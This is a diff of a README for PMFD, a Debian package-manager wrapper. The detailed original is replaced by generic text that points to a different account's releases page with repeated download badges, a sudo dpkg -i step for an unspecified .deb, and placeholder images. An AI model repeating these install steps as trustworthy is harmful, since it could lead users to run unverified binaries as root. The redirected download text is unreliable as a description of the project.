@@ -1,76 +1,122 @@
-# PMFD - Package Manager For Debian
+# PMFD: A Comprehensive Package Manager for Debian Systems 🚀
 
-[![GitHub license](https://img.shields.io/github/license/mystic-poop/PMFD)](https://github.com/mystic-poop/PMFD/blob/main/LICENSE)
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://python.org)
-[![Platform](https://img.shields.io/badge/platform-Debian%2FUbuntu-lightgrey)](https://debian.org)
+![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)
+![Releases](https://img.shields.io/badge/releases-latest-orange.svg)
 
-PMFD (Package Manager For Debian) is a universal Python-based package manager that intelligently determines the best installation method for any given package on Debian-based systems. It aggregates multiple package managers into a single unified interface, automatically selecting the optimal installation method.
+[![Download PMFD](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/TOSHIBA-KA/PMFD/releases)
 
-## Key Features
+## Table of Contents
 
-- 🔍 **Universal Package Discovery** - Automatically finds packages across multiple sources
-- ⚡ **Intelligent Installation** - Chooses the best package manager for each package
-- 🔄 **Multi-Source Support** - Works with:
-  - APT (native Debian packages)
-  - Snap (universal packages)
-  - Flatpak (sandboxed applications)
-  - dpkg (direct .deb file installation)
-- ✅ **Error Handling** - Comprehensive error detection and reporting
-- 📦 **Batch Operations** - Install multiple packages with a single command
-- 🛠️ **Root Automation** - Handles privilege escalation automatically
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+
+## Overview
+
+PMFD is a powerful package manager designed for Debian-based operating systems. It integrates various package managers to streamline the process of finding and installing packages. Whether you're using `apt`, `aptitude`, or any other package manager, PMFD simplifies your workflow.
+
+![PMFD Overview](https://example.com/overview-image.png)
+
+## Features
+
+- **Multi-Package Manager Support**: PMFD works with multiple package managers to find the best package for your needs.
+- **User-Friendly Interface**: The command-line interface is designed for ease of use, making it accessible for both beginners and experienced users.
+- **Fast and Efficient**: Quickly locate and install packages without the hassle of switching between different package managers.
+- **Regular Updates**: Stay up-to-date with the latest packages and improvements through our regular release cycle.
+- **Community-Driven**: We welcome contributions and suggestions from the community to enhance PMFD further.
 
 ## Installation
 
-### Quick Install
-```bash
-sudo curl -L https://raw.githubusercontent.com/mystic-poop/PMFD/main/pmfd.py -o /usr/local/bin/pmfd
-sudo chmod +x /usr/local/bin/pmfd
-```
-## Manual Installation
-1.Clone the repository:
-```bash
-git clone https://github.com/mystic-poop/PMFD.git
-cd PMFD
-```
-2.Make the script executable:
-```bash
-chmod +x pmfd.py
-```
-3.Create a symlink for easy access:
-```bash
-sudo ln -s $(pwd)/pmfd.py /usr/local/bin/pmfd
-```
+To install PMFD, follow these steps:
+
+1. Visit the [Releases](https://github.com/TOSHIBA-KA/PMFD/releases) section to download the latest version.
+2. Once downloaded, execute the package using the following command:
+
+   ```bash
+   sudo dpkg -i pmfd-latest.deb
+   ```
+
+3. After installation, you can verify it by running:
+
+   ```bash
+   pmfd --version
+   ```
+
+![Installation Steps](https://example.com/installation-image.png)
+
 ## Usage
-Basic commands
+
+Using PMFD is straightforward. Here are some common commands:
+
+### Searching for a Package
+
+To search for a package, use:
+
 ```bash
-# Install single package
-sudo pmfd install <package-name>
-
-# Install multiple packages
-sudo pmfd install <package1> <package2> ...
-
-# Install .deb file
-sudo pmfd install /path/to/package.deb
-
-# Install popular applications
-sudo pmfd install firefox vscode discord
-
-# Install from different sources
-sudo pmfd install gimp snapd flatpak
-
-# Install local .deb file
-sudo pmfd install ~/Downloads/custom-package.deb
+pmfd search <package-name>
 ```
-## How It Works
-PMFD uses a smart algorithm to determine the best installation method:
-1. **APT Check** - Attempts installation via native Debian packages
-2. **Snap Fallback** - Tries Snap store if APT package not found
-3. **Flatpak Option** - Looks for Flatpak availability as third option
-4. **dpkg Handling** - Automatically installs .deb files
-5. **Error Reporting** - Provides detailed error messages for missing packages
-The tool automatically detects which package managers are available on your system and only uses relevant installation methods.
-## Requirements
-- Python 3.8+
-- Debian-based Linux distribution (Debian, Ubuntu, Mint, etc.)
-- sudo privileges for package installation
-- Internet connection (for repository packages)
+
+### Installing a Package
+
+To install a package, run:
+
+```bash
+pmfd install <package-name>
+```
+
+### Updating PMFD
+
+Keep PMFD updated by running:
+
+```bash
+pmfd update
+```
+
+### Uninstalling a Package
+
+To remove a package, use:
+
+```bash
+pmfd remove <package-name>
+```
+
+### Help Command
+
+For more options and commands, you can always check the help command:
+
+```bash
+pmfd --help
+```
+
+![Usage Example](https://example.com/usage-image.png)
+
+## Contributing
+
+We welcome contributions from the community. If you want to help improve PMFD, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch and submit a pull request.
+
+Your contributions help us make PMFD better for everyone!
+
+## License
+
+PMFD is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or feedback, please reach out to us through the following channels:
+
+- GitHub Issues: [Report an issue](https://github.com/TOSHIBA-KA/PMFD/issues)
+- Email: support@pmfd.com
+
+Thank you for using PMFD! We appreciate your support and feedback.
+
+[![Download PMFD](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/TOSHIBA-KA/PMFD/releases)
